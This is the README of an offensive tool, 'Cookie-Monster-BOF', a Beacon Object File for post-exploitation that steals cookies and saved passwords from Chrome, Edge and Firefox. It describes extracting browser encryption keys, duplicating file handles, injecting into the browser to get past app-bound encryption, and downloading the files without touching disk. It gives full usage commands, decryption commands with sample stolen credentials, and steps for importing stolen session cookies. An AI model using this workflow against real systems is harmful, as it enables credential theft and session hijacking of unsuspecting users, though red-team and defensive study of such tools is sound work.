# Cookie-Monster-BOF
Steal browser cookies for edge, chrome and firefox through a BOF!

Cookie Monster BOF will extract the WebKit Master Key and the App Bound Encryption Key for both Edge and Chrome, locate a browser process with a handle to the Cookies and Login Data files, copy the handle(s) and then filelessly download the target file(s).

Once the Cookies/Login Data file(s) are downloaded, the python decryption script can be used to extract those secrets! Firefox module will parse the profiles.ini and locate where the logins.json and key4.db files are located and download them. A seperate github repo is referenced for offline decryption.  

Chrome & Edge 127+ Updates: new chromium browser cookies (v20) use the app bound key to encrypt the cookies. As a result, this makes retrieving the app_bound_encrypted_key slightly more difficult. Thanks to [snovvcrash](https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824) this process can be accomplished without having to escalate your privileges. The catch is your process must be running out of the web browser's application directory. i.e. must inject into Chrome/Edge or spawn a beacon from the same application directory as the browser. 
 
## BOF Usage
```
Usage: cookie-monster [ --chrome || --edge || --firefox || --chromeCookiePID <pid> || --chromeLoginDataPID <PID> || --edgeCookiePID <pid> || --edgeLoginDataPID <pid>] 
cookie-monster Example: 
   cookie-monster --chrome 
   cookie-monster --edge 
   cookie-monster --firefox 
   cookie-monster --chromeCookiePID 1337
   cookie-monster --chromeLoginDataPID 1337
   cookie-monster --edgeCookiePID 4444
   cookie-monster --edgeLoginDataPID 4444
cookie-monster Options: 
    --chrome, looks at all running processes and handles, if one matches chrome.exe it copies the handle to Cookies/Login Data and then copies the file to the CWD 
    --edge, looks at all running processes and handles, if one matches msedge.exe it copies the handle to Cookies/Login Data and then copies the file to the CWD 
    --firefox, looks for profiles.ini and locates the key4.db and logins.json file 
    --chromeCookiePID, if chrome PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file
    --chromeLoginDataPID, if chrome PID is provided look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file  
    --edgeCookiePID, if edge PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file
    --edgeLoginDataPID, if edge PID is provided look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file  
```

## Decryption Steps
Install requirements
```
pip3 install -r requirements.txt
```
Decrypt Chrome/Edge Cookies File
```
python .\decrypt.py "\xec\xfc...." --cookies ChromeCookie.db

Results Example:
-----------------------------------
Host: .github.com
Path: /
Name: dotcom_user
Cookie: KingOfTheNOPs
Expires: Oct 28 2024 21:25:22

Host: github.com
Path: /
Name: user_session
Cookie: x123.....
Expires: Nov 11 2023 21:25:22
```

Decrypt Chrome/Edge Cookies File and save to json
```
python .\decrypt.py "\xec\xfc...." --cookie-editor
Results Example:
Cookies saved to cookies_for_cookie_editor.json
```
Import cookies JSON file with https://cookie-editor.com/ 

Decrypt Chome/Edge Passwords File
```
python .\decrypt.py "\xec\xfc...." --passwords ChromePasswords.db

Results Example:
-----------------------------------
URL: https://test.com/
Username: tester
Password: McTesty
```
Decrypt Firefox Cookies and Stored Credentials: <br>
https://github.com/lclevy/firepwd

## Installation
Ensure Mingw-w64 and make is installed on the linux prior to compiling.
```
make
```

### TO-DO
- update decrypt.py to support firefox based on [firepwd](https://github.com/lclevy/firepwd) and add bruteforce module based on [DonPAPI](https://github.com/login-securite/DonPAPI)

## References
This project could not have been done without the help of Mr-Un1k0d3r and his amazing seasonal videos!
Highly recommend checking out his lessons!!! <br>
Cookie Webkit Master Key Extractor:
https://github.com/Mr-Un1k0d3r/Cookie-Graber-BOF <br>
Fileless download:
https://github.com/fortra/nanodump <br>
Decrypt Cookies and Login Data:
https://github.com/login-securite/DonPAPI <br>
App Bound Key Decryption:
https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824 <br>
